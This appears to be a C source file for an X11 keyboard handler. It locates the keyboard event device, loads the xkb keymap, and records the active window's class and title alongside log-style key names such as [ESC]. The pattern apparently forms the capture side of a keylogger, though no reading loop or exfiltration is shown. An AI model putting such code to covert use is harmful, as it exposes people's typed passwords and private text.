#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keyboard_handler.h"


int KeyboardHandler_init(KeyboardHandler *handler) {
    handler->dpy = NULL;
    handler->keymap = NULL;
    handler->ctx = NULL;
    handler->state = NULL;
    handler->active_window = NULL;

    handler->dpy = XOpenDisplay(NULL);
    if (!handler->dpy) {
        fprintf(stderr, "Failed to open X display\n");
        return 1;
    }

    handler->xcb_conn = XGetXCBConnection(handler->dpy);
    if (!handler->xcb_conn) {
        fprintf(stderr, "Failed to get XCB connection\n");
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->device_id = xkb_x11_get_core_keyboard_device_id(handler->xcb_conn);
    if (handler->device_id == -1) {
        fprintf(stderr, "Failed to get core keyboard device ID\n");
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->ctx = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
    if (!handler->ctx) {
        fprintf(stderr, "Failed to create xkb context\n");
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->keymap = xkb_x11_keymap_new_from_device(handler->ctx, handler->xcb_conn, handler->device_id, 0);
    if (!handler->keymap) {
        fprintf(stderr, "Failed to get keymap\n");
        xkb_context_unref(handler->ctx);
        XCloseDisplay(handler->dpy);
        return 1;
    }

    handler->state = xkb_x11_state_new_from_device(handler->keymap, handler->xcb_conn, handler->device_id);
    if (!handler->state) {
        fprintf(stderr, "Failed to get state\n");
        xkb_keymap_unref(handler->keymap);
        xkb_context_unref(handler->ctx);
        XCloseDisplay(handler->dpy);
        return 1;
    }

    return 0;
}

void KeyboardHandler_cleanup(KeyboardHandler *handler) {
    if (handler->state) {
        xkb_state_unref(handler->state);
    }
    if (handler->keymap) {
        xkb_keymap_unref(handler->keymap);
    }
    if (handler->ctx) {
        xkb_context_unref(handler->ctx);
    }
    if (handler->dpy) {
        XCloseDisplay(handler->dpy);
    }
    if (handler->active_window){
        free(handler->active_window);
    }
}

static int get_window_property(Display *display, Window window, Atom atom, unsigned char **prop) {
    Atom type;
    int format;
    unsigned long nitems, bytes_after;

    int status = XGetWindowProperty(display, window, atom, 0, ~0L, False, AnyPropertyType,
                                    &type, &format, &nitems, &bytes_after, prop);
    if (status != Success || *prop == NULL) {
        return 1;
    }

    return 0;
}

static void set_active_window_name(const char *window_name, const char *class_name, char **res) {
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "\n\n%s: %s\n", class_name, window_name);
    *res = strdup(tmp);
}

int get_active_window(Display *display, char **window) {
    Atom net_active_window = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
    Atom wm_class = XInternAtom(display, "WM_CLASS", False);
    Atom wm_name = XInternAtom(display, "_NET_WM_NAME", False);

    Window root = DefaultRootWindow(display);
    unsigned char *prop = NULL;

    if (get_window_property(display, root, net_active_window, &prop) != 0) {
        return 1;
    }

    Window active_window = *(Window *)prop;
    XFree(prop);

    char *class_name = NULL;
    char *window_name = NULL;

    get_window_property(display, active_window, wm_class, (unsigned char **)&class_name);
    get_window_property(display, active_window, wm_name, (unsigned char **)&window_name);

    if (class_name && window_name) {
        set_active_window_name(class_name, window_name, window);
        XFree(class_name);
        XFree(window_name);
    } else if (class_name) {
        set_active_window_name(class_name, window_name, window);
        XFree(class_name);
    } else if (window_name) {
        set_active_window_name(class_name, window_name, window);
        XFree(window_name);
    } else {
        set_active_window_name(class_name, window_name, window);
    }


    return 0;
}

const char* get_key_name(xkb_keysym_t keysym){
    switch (keysym) {
        case XKB_KEY_Return: return "\n";
        case XKB_KEY_Escape: return "[ESC]";
        case XKB_KEY_Tab: return "\t";
        case XKB_KEY_BackSpace: return "[BackSpace]";
        default: return NULL;
    }
}

int findKeyboardDeviceFileName(char *keyboardPath) {
    FILE *file = fopen(PROC_INPUT_DEVICES, "r");
    if (!file) {
        fprintf(stderr, "Error opening %s\n", PROC_INPUT_DEVICES);
        return 1;
    }

    char line[256];
    char filename_event[64] = "";
    char *ev = NULL;

    while (fgets(line, sizeof(line), file)) {
        if (line[0] == '\n') {
            if (ev && filename_event[0]) {
                sprintf(keyboardPath, "%s%s", EVENT_PATH, filename_event);
                fclose(file);
                return 0;
            }
            ev = NULL;
            filename_event[0] = '\0';
        } else if (strstr(line, "Handlers=")) {
            char *ptr = strstr(line, "event");
            int event_number;
            if (ptr) {
               sscanf(ptr, "event%d", &event_number);
               snprintf(filename_event, sizeof(filename_event), "event%d", event_number);
            }
        } else if (strstr(line, "EV=120013")) {
            ev = line;
        }
    }
    fclose(file);
    return 1;
}